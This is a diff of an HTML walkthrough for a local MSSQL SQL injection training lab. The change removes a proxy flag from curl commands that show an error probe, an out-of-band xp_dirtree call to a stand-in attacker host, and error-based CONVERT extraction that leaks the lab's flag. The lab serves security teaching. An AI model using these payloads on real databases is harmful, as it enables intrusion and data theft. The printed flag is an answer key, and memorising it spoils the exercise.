@@ -7,7 +7,7 @@
         <span class="terminal-title">Step 1. Normal Lookup</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab12" \<br> --data-urlencode "host=web-01"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab12" \<br> --data-urlencode "host=web-01"<br><br>
         <span class="prompt">Input: </span>web-01<br>
         <span class="prompt">SQL: </span>SELECT hostname, cpu_usage, memory_usage, disk_io FROM metrics WHERE hostname = 'web-01'<br><br>
         <span class="prompt">Output:</span><br>
@@ -24,10 +24,10 @@
         <span class="terminal-title">Step 2. Error + WAF Detection</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "..." --data-urlencode "host='"<br>
+        <span class="prompt">$ </span>curl -s "..." --data-urlencode "host='"<br>
         <span class="prompt">Input: </span>'<br>
         <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[42000]: Unclosed quotation mark after the character string '''.</strong><br><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "..." --data-urlencode "host='; EXEC xp_dirtree '\\test.attacker.com\x'; -- -"<br>
+        <span class="prompt">$ </span>curl -s "..." --data-urlencode "host='; EXEC xp_dirtree '\\test.attacker.com\x'; -- -"<br>
         <span class="prompt">Input: </span>'; EXEC xp_dirtree '\\test.attacker.com\x'; -- -<br>
         <span class="prompt">Result: </span><strong>Blocked: Extended stored procedures are disabled.</strong><br>
         <span class="prompt">// xp_dirtree, xp_fileexist, xp_subdirs are all blocked!</span>
@@ -43,7 +43,7 @@
         <span class="terminal-title">Step 3. CONVERT Extraction</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab12" \<br> --data-urlencode "host=' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab12" \<br> --data-urlencode "host=' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -"<br><br>
         <span class="prompt">Input: </span>' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -<br>
         <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the varchar value 'FLAG{ms_fn_x3_f1l3_unc}' to data type int.</strong>
     </div>
@@ -103,7 +103,7 @@
         <span class="terminal-title">curl. Quick Solve</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab12" \<br> --data-urlencode "host=' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab12" \<br> --data-urlencode "host=' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -"<br><br>
         <span class="prompt">Output: </span><strong>MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the varchar value 'FLAG{ms_fn_x3_f1l3_unc}' to data type int.</strong>
     </div>
 </div>
